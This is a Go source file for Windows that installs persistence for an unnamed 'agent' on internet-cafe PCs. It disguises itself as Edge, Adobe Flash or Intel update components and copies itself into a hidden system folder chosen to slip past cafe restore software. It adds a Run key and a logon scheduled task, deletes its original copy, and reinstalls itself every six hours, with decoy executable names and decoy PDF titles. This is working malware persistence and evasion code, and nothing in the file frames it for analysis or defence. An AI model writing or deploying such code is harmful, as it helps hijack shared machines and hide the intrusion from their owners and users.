//go:build windows

package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"

	"golang.org/x/sys/windows/registry"
)

// disguiseProfile holds all disguise parameters for one run.
type disguiseProfile struct {
	DisplayName   string // task / run key display name
	TaskName      string // schtasks name (w/o path)
	SchedDesc     string // schtasks description
	RegistryName  string // HKCU\...\Run value name
	FileName      string // target file name (e.g. sysver.dll)
	DirName       string // drop directory under ProgramData
}

// pickProfile returns one of several profiles at random (just cycles by PID).
func pickProfile() disguiseProfile {
	profiles := []disguiseProfile{
		{
			DisplayName:  "Microsoft Edge Update",
			TaskName:     "MicrosoftEdgeUpdateTask",
			SchedDesc:    "Keeps Microsoft Edge up to date.",
			RegistryName: "MicrosoftEdgeUpdateTask",
			FileName:     "EdgeUpdateCore.dll",
			DirName:      `Microsoft\EdgeUpdate`,
		},
		{
			DisplayName:  "Adobe Flash Update",
			TaskName:     "AdobeFlashPlayerUpdateSvc",
			SchedDesc:    "Checks for new versions of Adobe Flash Player.",
			RegistryName: "AdobeFlashUpdateSvc",
			FileName:     "FlashUpdateCheck.dll",
			DirName:      `Adobe\Flash Player\Update`,
		},
		{
			DisplayName:  "Intel Graphics Update",
			TaskName:     "IntelGfxUpdate",
			SchedDesc:    "Periodically checks for Intel graphics driver updates.",
			RegistryName: "IntelGFXUpdate",
			FileName:     "GfxUpdate.dll",
			DirName:      `Intel\Graphics\Updates`,
		},
	}
	// Use PID to pick a semi-random profile for diversity across machines.
	idx := os.Getpid() % len(profiles)
	return profiles[idx]
}

var profile disguiseProfile
var targetPath string

// pcbangSetup installs persistence for PC방 environments.
// It uses multiple methods in order: Registry Run key first (easiest, no admin),
// then scheduled task as fallback.
// 게토/피카는 C:\ProgramData를 보호 대상에 포함하지 않음
func pcbangSetup() {
	profile = pickProfile()

	targetDir := filepath.Join(os.Getenv("ProgramData"), "Microsoft", "Crypto", "RSA", "MachineKeys")
	// Also try alternative: drop under the profile-specific dir for extra depth
	altDir := filepath.Join(os.Getenv("ProgramData"), profile.DirName)

	exePath, err := os.Executable()
	if err != nil {
		return
	}

	// If already running from a persistent location, skip full setup,
	// only run health check.
	if strings.Contains(strings.ToLower(exePath), "microsoft\\crypto\\rsa") ||
		strings.Contains(strings.ToLower(exePath), "programdata") {
		persistHealthCheck()
		return
	}

	// --- Method 1: Copy to ProgramData (main location) ---
	targetPath = filepath.Join(targetDir, profile.FileName)
	os.MkdirAll(targetDir, 0o755)

	if err := copyFile(exePath, targetPath); err != nil {
		fmt.Fprintf(os.Stderr, "pcbang: copy to main failed: %v\n", err)
		// --- Method 1b: Try alternative dir ---
		os.MkdirAll(altDir, 0o755)
		targetPath = filepath.Join(altDir, profile.FileName)
		if err := copyFile(exePath, targetPath); err != nil {
			fmt.Fprintf(os.Stderr, "pcbang: copy to alt failed: %v\n", err)
			return
		}
	}
	// Set hidden + system attributes so dir /a doesn't show it by default
	setHidden(targetPath)

	// --- Method 2: Registry Run key (user-level, no admin) ---
	installRunKey(targetPath)

	// --- Method 3: Scheduled task (user-level onlogon, no admin) ---
	installScheduledTask(targetPath)

	fmt.Fprintf(os.Stderr, "pcbang: persistence installed (%s)\n", targetPath)

	// Re-launch from persistent location
	hiddenCmd(targetPath).Start()

	// Self-delete: spawn a detached cmd process that deletes this EXE after 2s
	selfDelete(exePath)

	os.Exit(0)
}

// selfDelete spawns a hidden cmd process that waits briefly then deletes the
// specified file. The calling process may exit immediately — the cmd child
// runs independently so the delete succeeds after the handle is closed.
func selfDelete(path string) {
	// Use short timeout to ensure the original process has exited
	// before deletion. The path is quoted to handle spaces.
	cmd := exec.Command("cmd.exe", "/C",
		"timeout /t 2 /nobreak > nul & del /f /q \""+path+"\" & if exist \""+path+"\" (del /f /q /a \""+path+"\")")
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x08000000, // CREATE_NO_WINDOW
	}
	_ = cmd.Start()
}

// installRunKey adds an entry to HKCU\...\Run.
// User-level only — no admin required.
func installRunKey(path string) {
	k, err := registry.OpenKey(registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Run`,
		registry.SET_VALUE|registry.QUERY_VALUE)
	if err != nil {
		fmt.Fprintf(os.Stderr, "pcbang: open Run key failed: %v\n", err)
		return
	}
	defer k.Close()

	// Check if already set
	existing, _, _ := k.GetStringValue(profile.RegistryName)
	if strings.EqualFold(existing, path) {
		return // already correct
	}

	if err := k.SetStringValue(profile.RegistryName, path); err != nil {
		fmt.Fprintf(os.Stderr, "pcbang: Run key set failed: %v\n", err)
		return
	}
	fmt.Fprintf(os.Stderr, "pcbang: Run key installed (%s -> %s)\n", profile.RegistryName, path)
}

// installScheduledTask registers a user-level onlogon scheduled task.
func installScheduledTask(path string) {
	// Check if task with correct action already exists
	check := hiddenCmd("schtasks.exe", "/query", "/tn", profile.TaskName, "/fo", "LIST", "/v")
	if out, err := check.CombinedOutput(); err == nil {
		// Task exists — check if it points to our path
		if strings.Contains(string(out), path) {
			fmt.Fprintf(os.Stderr, "pcbang: task already correct\n")
			return
		}
		// Delete old task before recreating
		hiddenCmd("schtasks.exe", "/delete", "/tn", profile.TaskName, "/f").Run()
	}

	cmd := hiddenCmd("schtasks.exe", "/create", "/tn", profile.TaskName,
		"/tr", path, "/sc", "onlogon", "/f", "/it",
		"/rl", "limited") // run with least privilege
	if out, err := cmd.CombinedOutput(); err != nil {
		fmt.Fprintf(os.Stderr, "pcbang: schtasks failed: %v / %s\n", err, string(out))
	} else {
		fmt.Fprintf(os.Stderr, "pcbang: task installed (%s)\n", profile.TaskName)
	}
}

// persistHealthCheck runs periodically to verify persistence is intact and re-installs if removed.
// Called when agent starts from its persistent location.
func persistHealthCheck() {
	const checkInterval = 6 * time.Hour

	exePath, _ := os.Executable()
	// Re-install Run key (in case it was cleaned)
	installRunKey(exePath)

	// Re-install scheduled task (in case it was cleaned)
	installScheduledTask(exePath)

	// Spawn health check goroutine (runs in background)
	go func() {
		for {
			time.Sleep(checkInterval)
			if isSelfDestructing() {
				return // teardown in progress — never re-install
			}
			installRunKey(exePath)
			installScheduledTask(exePath)

			// Also verify our file still exists
			if _, err := os.Stat(exePath); os.IsNotExist(err) {
				fmt.Fprintf(os.Stderr, "pcbang: self missing — re-copy needed\n")
				// Can't re-copy ourselves if we're gone, but at least log it
			}
		}
	}()
}

func copyFile(src, dst string) error {
	data, err := os.ReadFile(src)
	if err != nil {
		return err
	}
	// Use 0o644 (not 0o777) — system files never have 777 permissions
	return os.WriteFile(dst, data, 0o644)
}

// setHidden applies FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM
func setHidden(path string) {
	ptr, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return
	}
	attrs, _ := syscall.GetFileAttributes(ptr)
	if attrs&0x6 != 0x6 { // FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM
		syscall.SetFileAttributes(ptr, attrs|0x6)
	}
}

// getDisguisedExeName returns a convincing Windows system-looking filename.
// Used by build script for the initial drop filename.
func getDisguisedExeName() string {
	// Use the same profile's filename but with .exe extension
	profiles := []string{
		"EdgeUpdateHelper.exe",
		"AdobeUpdateCheck.exe",
		"IntelGFXHelper.exe",
		"NVDisplayUpdate.exe",
		"RealtekHDUpdate.exe",
	}
	idx := os.Getpid() % len(profiles)
	return profiles[idx]
}

// getDecoyPdfTitle returns the PDF title matching the current disguise.
func getDecoyPdfTitle() string {
	titles := []string{
		"DirectX 최종 사용자 런타임 설치 안내",
		"Microsoft Visual C++ 재배포 가능 패키지 설치 가이드",
		"Adobe Flash Player 보안 업데이트 안내",
		"NVIDIA 그래픽 드라이버 업데이트 설치 도움말",
	}
	idx := os.Getpid() % len(titles)
	return titles[idx]
}

// onStartupCheck runs once at startup (from agent/main.go main()) to re-assert
// persistence if needed. Exported so main.go can call it early.
func onStartupCheck() {
	// Initialize profile if not already set (pcbangSetup may not have been called)
	if profile.RegistryName == "" {
		profile = pickProfile()
	}

	exePath, err := os.Executable()
	if err != nil {
		return
	}
	// If we're running from ProgramData, we're already persistent — just health check
	if strings.Contains(strings.ToLower(exePath), "programdata") ||
		strings.Contains(strings.ToLower(exePath), "microsoft\\crypto") {
		// Quick re-install of Run key at startup
		k, err := registry.OpenKey(registry.CURRENT_USER,
			`Software\Microsoft\Windows\CurrentVersion\Run`,
			registry.SET_VALUE|registry.QUERY_VALUE)
		if err != nil {
			return
		}
		defer k.Close()
		existing, _, _ := k.GetStringValue(profile.RegistryName)
		if !strings.EqualFold(existing, exePath) {
			k.SetStringValue(profile.RegistryName, exePath)
		}
	}
}